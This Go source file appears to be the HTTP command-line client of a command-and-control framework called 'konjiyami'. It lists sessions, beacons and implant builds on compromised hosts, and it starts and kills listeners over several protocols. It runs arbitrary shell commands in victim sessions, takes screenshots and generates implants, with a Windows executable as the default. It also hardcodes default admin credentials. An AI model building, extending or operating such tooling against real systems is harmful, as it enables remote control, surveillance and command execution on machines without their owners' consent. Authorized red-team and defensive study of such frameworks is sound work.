package cli

import (
	"bufio"
	"encoding/json"
	"fmt"
	"os"
	"strconv"
	"strings"
	"text/tabwriter"

	"konjiyami/client/transport"

	"github.com/spf13/cobra"
)

func init() {
	cmdHTTP.Flags().String("host", "127.0.0.1", "Server host")
	cmdHTTP.Flags().Int("port", 8080, "Server HTTP port")
	cmdHTTP.Flags().StringP("user", "u", "admin", "Username")
	cmdHTTP.Flags().StringP("pass", "p", "konjiyami", "Password")
	rootCmd.AddCommand(cmdHTTP)
}

var cmdHTTP = &cobra.Command{
	Use:   "http",
	Short: "Connect to server via HTTP REST API (dogfooding mode)",
	Run: func(cmd *cobra.Command, args []string) {
		host, _ := cmd.Flags().GetString("host")
		port, _ := cmd.Flags().GetInt("port")
		user, _ := cmd.Flags().GetString("user")
		pass, _ := cmd.Flags().GetString("pass")

		fmt.Printf("Connecting to http://%s:%d ...\n", host, port)
		client, err := transport.HTTPConnect(host, port, user, pass)
		if err != nil {
			fmt.Printf("[!] %s\n", err)
			return
		}
		fmt.Println("[*] Connected via HTTP REST API")
		httpShell(client)
	},
}

func httpShell(c *transport.HTTPClient) {
	scanner := bufio.NewScanner(os.Stdin)
	fmt.Println("Type 'help' for available commands, 'exit' to quit.")

	for {
		fmt.Print("\nkonjiyami http > ")
		if !scanner.Scan() {
			break
		}
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}
		parts := strings.Fields(line)
		cmd := strings.ToLower(parts[0])
		cmdArgs := parts[1:]

		switch cmd {
		case "exit", "quit":
			return
		case "help":
			printHTTPHelp()
		case "version":
			httpVersion(c)
		case "health":
			httpHealth(c)
		case "status":
			httpStatus(c)
		case "sessions":
			httpSessions(c)
		case "beacons":
			httpBeacons(c)
		case "listeners", "jobs":
			httpListeners(c)
		case "implants":
			httpImplants(c)
		case "listen":
			httpStartListener(c, cmdArgs)
		case "kill-listener":
			httpKillListener(c, cmdArgs)
		case "kill-session":
			httpKillSession(c, cmdArgs)
		case "kill-beacon":
			httpKillBeacon(c, cmdArgs)
		case "exec":
			httpExec(c, cmdArgs)
		case "screenshot":
			httpScreenshot(c, cmdArgs)
		case "generate":
			httpGenerate(c, cmdArgs)
		default:
			fmt.Printf("[!] Unknown command: %s (try 'help')\n", cmd)
		}
	}
}

func printHTTPHelp() {
	fmt.Println(`
  status                        Show enriched server status
  sessions                      List active sessions
  beacons                       List beacons
  listeners                     List active listeners
  implants                      List implant builds
  listen <proto> [port] [host]  Start a listener (mtls|http|https|dns|wg)
  kill-listener <id>            Kill a listener
  kill-session <id>             Kill a session
  kill-beacon <id>              Kill a beacon
  exec <session-id> <command>   Execute command in a session
  screenshot <session-id>       Take screenshot from a session
  generate [flags]              Generate an implant
  version                       Show server version
  health                        Health check
  help                          This help
  exit                          Quit`)
}

func httpVersion(c *transport.HTTPClient) {
	var v map[string]string
	if err := c.Get("/api/v1/version", &v); err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	fmt.Printf("Server version: %s\n", v["version"])
}

func httpHealth(c *transport.HTTPClient) {
	var h map[string]string
	if err := c.Get("/api/v1/health", &h); err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	fmt.Printf("Health: %s\n", h["status"])
}

func httpStatus(c *transport.HTTPClient) {
	var s map[string]interface{}
	if err := c.Get("/api/v1/status", &s); err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	fmt.Printf("Version:    %v\n", s["version"])
	fmt.Printf("Sessions:   %.0f\n", s["sessionCount"])
	fmt.Printf("Beacons:    %.0f\n", s["beaconCount"])
	fmt.Printf("Listeners:  %.0f\n", s["listenerCount"])
	fmt.Printf("Payloads:   %.0f\n", s["payloadCount"])
	fmt.Printf("Updated:    %v\n", s["lastUpdatedUTC"])
}

func httpSessions(c *transport.HTTPClient) {
	var resp struct {
		Items []struct {
			ID       string `json:"id"`
			Name     string `json:"name"`
			Hostname string `json:"hostname"`
			Username string `json:"username"`
			OS       string `json:"os"`
			Arch     string `json:"arch"`
			Health   string `json:"health"`
		} `json:"items"`
		Total int `json:"total"`
	}
	if err := c.Get("/api/v1/sessions", &resp); err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	fmt.Printf("Sessions (%d):\n", resp.Total)
	w := tabwriter.NewWriter(os.Stdout, 0, 4, 2, ' ', 0)
	fmt.Fprintln(w, "ID\tNAME\tHOST\tUSER\tOS/ARCH\tHEALTH")
	for _, s := range resp.Items {
		fmt.Fprintf(w, "%s\t%s\t%s\t%s\t%s/%s\t%s\n", s.ID[:12], s.Name, s.Hostname, s.Username, s.OS, s.Arch, s.Health)
	}
	w.Flush()
}

func httpBeacons(c *transport.HTTPClient) {
	var resp struct {
		Items []struct {
			ID       string `json:"id"`
			Name     string `json:"name"`
			Hostname string `json:"hostname"`
			OS       string `json:"os"`
			Interval int64  `json:"interval"`
		} `json:"items"`
		Total int `json:"total"`
	}
	if err := c.Get("/api/v1/beacons", &resp); err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	fmt.Printf("Beacons (%d):\n", resp.Total)
	w := tabwriter.NewWriter(os.Stdout, 0, 4, 2, ' ', 0)
	fmt.Fprintln(w, "ID\tNAME\tHOST\tOS\tINTERVAL")
	for _, b := range resp.Items {
		fmt.Fprintf(w, "%s\t%s\t%s\t%s\t%ds\n", b.ID[:12], b.Name, b.Hostname, b.OS, b.Interval)
	}
	w.Flush()
}

func httpListeners(c *transport.HTTPClient) {
	var resp struct {
		Items []struct {
			ID       int    `json:"id"`
			Name     string `json:"name"`
			Protocol string `json:"protocol"`
			Port     int    `json:"port"`
		} `json:"items"`
		Total int `json:"total"`
	}
	if err := c.Get("/api/v1/listeners", &resp); err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	fmt.Printf("Listeners (%d):\n", resp.Total)
	w := tabwriter.NewWriter(os.Stdout, 0, 4, 2, ' ', 0)
	fmt.Fprintln(w, "ID\tNAME\tPROTOCOL\tPORT")
	for _, l := range resp.Items {
		fmt.Fprintf(w, "%d\t%s\t%s\t%d\n", l.ID, l.Name, l.Protocol, l.Port)
	}
	w.Flush()
}

func httpImplants(c *transport.HTTPClient) {
	var resp struct {
		Items []struct {
			Name   string `json:"name"`
			OS     string `json:"os"`
			Arch   string `json:"arch"`
			Format string `json:"format"`
		} `json:"items"`
		Total int `json:"total"`
	}
	if err := c.Get("/api/v1/implants", &resp); err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	fmt.Printf("Implant builds (%d):\n", resp.Total)
	w := tabwriter.NewWriter(os.Stdout, 0, 4, 2, ' ', 0)
	fmt.Fprintln(w, "NAME\tOS\tARCH\tFORMAT")
	for _, b := range resp.Items {
		fmt.Fprintf(w, "%s\t%s\t%s\t%s\n", b.Name, b.OS, b.Arch, b.Format)
	}
	w.Flush()
}

func httpStartListener(c *transport.HTTPClient, args []string) {
	if len(args) < 1 {
		fmt.Println("Usage: listen <protocol> [port] [host]")
		return
	}
	body := map[string]interface{}{"protocol": args[0]}
	if len(args) >= 2 {
		if p, err := strconv.Atoi(args[1]); err == nil {
			body["port"] = p
		}
	}
	if len(args) >= 3 {
		body["host"] = args[2]
	}
	var resp map[string]interface{}
	if err := c.PostJSON("/api/v1/listeners", body, &resp); err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	j, _ := json.MarshalIndent(resp, "", "  ")
	fmt.Printf("[*] Listener started:\n%s\n", j)
}

func httpKillListener(c *transport.HTTPClient, args []string) {
	if len(args) < 1 {
		fmt.Println("Usage: kill-listener <id>")
		return
	}
	if err := c.Delete("/api/v1/listeners/" + args[0]); err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	fmt.Println("[*] Listener killed")
}

func httpKillSession(c *transport.HTTPClient, args []string) {
	if len(args) < 1 {
		fmt.Println("Usage: kill-session <id>")
		return
	}
	if err := c.Delete("/api/v1/sessions/" + args[0]); err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	fmt.Println("[*] Session killed")
}

func httpKillBeacon(c *transport.HTTPClient, args []string) {
	if len(args) < 1 {
		fmt.Println("Usage: kill-beacon <id>")
		return
	}
	if err := c.Delete("/api/v1/beacons/" + args[0]); err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	fmt.Println("[*] Beacon killed")
}

func httpExec(c *transport.HTTPClient, args []string) {
	if len(args) < 2 {
		fmt.Println("Usage: exec <session-id> <command...>")
		return
	}
	sid := args[0]
	cmd := strings.Join(args[1:], " ")
	var resp struct {
		Output string `json:"output"`
		Status uint32 `json:"status"`
	}
	if err := c.PostJSON("/api/v1/sessions/"+sid+"/console", map[string]string{"command": cmd}, &resp); err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	fmt.Println(resp.Output)
}

func httpScreenshot(c *transport.HTTPClient, args []string) {
	if len(args) < 1 {
		fmt.Println("Usage: screenshot <session-id>")
		return
	}
	var resp struct {
		Output string `json:"output"`
	}
	if err := c.PostJSON("/api/v1/sessions/"+args[0]+"/actions", map[string]string{"action": "screenshot"}, &resp); err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	fmt.Printf("[*] Screenshot saved: %s\n", resp.Output)
}

func httpGenerate(c *transport.HTTPClient, args []string) {
	body := map[string]interface{}{
		"os":     "windows",
		"arch":   "amd64",
		"format": "exe",
	}
	for i := 0; i < len(args)-1; i += 2 {
		key := strings.TrimPrefix(args[i], "--")
		val := args[i+1]
		switch key {
		case "os":
			body["os"] = val
		case "arch":
			body["arch"] = val
		case "format":
			body["format"] = val
		case "listener", "c2":
			body["listener"] = val
		case "name":
			body["name"] = val
		case "beacon":
			body["isBeacon"] = val == "true"
		}
	}
	fmt.Println("[*] Generating implant...")
	var resp map[string]interface{}
	if err := c.PostJSON("/api/v1/implants/generate", body, &resp); err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	j, _ := json.MarshalIndent(resp, "", "  ")
	fmt.Printf("[*] Generated:\n%s\n", j)
}
